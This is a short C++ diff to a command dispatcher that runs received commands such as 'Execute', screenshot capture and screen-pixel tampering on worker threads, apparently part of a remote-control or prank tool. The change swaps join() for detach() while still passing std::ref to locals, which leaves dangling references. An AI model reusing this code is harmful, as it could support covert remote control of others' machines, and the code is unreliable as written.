@@ -31,31 +31,31 @@ void CommandHandler::callFunction(const std::vector<std::string>& input)
     {
         std::vector<std::string> args = {input[1], input[2]};
         std::thread t(commands::showMessageBox, std::ref(args));
-        t.join();
+        t.detach();
     }
 
     if (input[0] == "Execute ")
     {
         std::thread t(commands::execute, std::ref(input[1]));
-        t.join();
+        t.detach();
     }
 
     if (input[0] == "Cringe ")
     {
         std::thread t(commands::cringe);
-        t.join();
+        t.detach();
     }
 
     if (input[0] == "screentest ")
     {
         std::thread t(commands::Screenshot_C);
-        t.join();
+        t.detach();
     }
     
     if(input[0] == "randomPixel ")
     {
         std::thread t(commands::randomPixel, std::stoi(input[1]), std::stoi(input[2]), 50);
-        t.join();
+        t.detach();
     }
 
     if(input[0] == "Exit ")
